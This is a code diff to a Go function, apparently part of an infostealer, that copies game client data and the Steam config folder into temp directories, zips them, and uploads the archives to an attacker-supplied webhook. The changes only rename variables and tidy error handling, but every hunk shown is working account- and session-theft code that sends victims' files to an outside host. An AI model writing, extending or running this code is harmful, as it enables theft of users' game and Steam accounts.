@@ -45,22 +45,23 @@ func Run(webhook string) {
 			},
 		}
 
-		tempdir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
+		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
 		found := ""
 		for name, path := range paths {
-			dest := filepath.Join(tempdir, strings.Split(user, "\\")[2], name)
+			dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)
 
-			err := os.MkdirAll(dest, os.ModePerm)
-			if err != nil {
+			if err := os.MkdirAll(dest, os.ModePerm); err != nil {
 				continue
 			}
 
-			for fname, fpath := range path {
-				if filepath.Ext(fpath) != "" {
-					os.MkdirAll(filepath.Join(dest, fname), os.ModePerm)
-					err = fileutil.CopyFile(fpath, filepath.Join(dest, fname, filepath.Base(fpath)))
+			var err error
+
+			for fName, fPath := range path {
+				if filepath.Ext(fPath) != "" {
+					os.MkdirAll(filepath.Join(dest, fName), os.ModePerm)
+					err = fileutil.CopyFile(fPath, filepath.Join(dest, fName, filepath.Base(fPath)))
 				} else {
-					err = fileutil.CopyDir(fpath, filepath.Join(dest, fname))
+					err = fileutil.CopyDir(fPath, filepath.Join(dest, fName))
 				}
 
 				if err != nil {
@@ -75,15 +76,14 @@ func Run(webhook string) {
 		}
 
 		if found == "" {
-			os.RemoveAll(tempdir)
+			os.RemoveAll(tempDir)
 			continue
 		}
 
-		tempzip := filepath.Join(os.TempDir(), "games.zip")
+		tempZip := filepath.Join(os.TempDir(), "games.zip")
 
-		err := fileutil.Zip(tempdir, tempzip)
-		if err != nil {
-			os.RemoveAll(tempdir)
+		if err := fileutil.Zip(tempDir, tempZip); err != nil {
+			os.RemoveAll(tempDir)
 			continue
 		}
 
@@ -94,31 +94,29 @@ func Run(webhook string) {
 					"description": "```" + found + "```",
 				},
 			},
-		}, tempzip)
+		}, tempZip)
 
-		os.RemoveAll(tempdir)
-		os.Remove(tempzip)
+		os.RemoveAll(tempDir)
+		os.Remove(tempZip)
 	}
 
-	tempdir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
-	defer os.RemoveAll(tempdir)
+	tempDir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
+	defer os.RemoveAll(tempDir)
 
 	path := "C:\\Program Files (x86)\\Steam\\config"
 	if !fileutil.IsDir(path) {
 		return
 	}
 
-	err := fileutil.CopyDir(path, tempdir)
-	if err != nil {
+	if err := fileutil.CopyDir(path, tempDir); err != nil {
 		return
 	}
 
-	tempzip := filepath.Join(os.TempDir(), "steam.zip")
-	err = fileutil.Zip(tempdir, tempzip)
-	if err != nil {
+	tempZip := filepath.Join(os.TempDir(), "steam.zip")
+	if err := fileutil.Zip(tempDir, tempZip); err != nil {
 		return
 	}
-	defer os.Remove(tempzip)
+	defer os.Remove(tempZip)
 
 	requests.Webhook(webhook, map[string]interface{}{
 		"embeds": []map[string]interface{}{
@@ -127,5 +125,5 @@ func Run(webhook string) {
 				"description": "`✅✅✅`",
 			},
 		},
-	}, tempzip)
+	}, tempZip)
 }
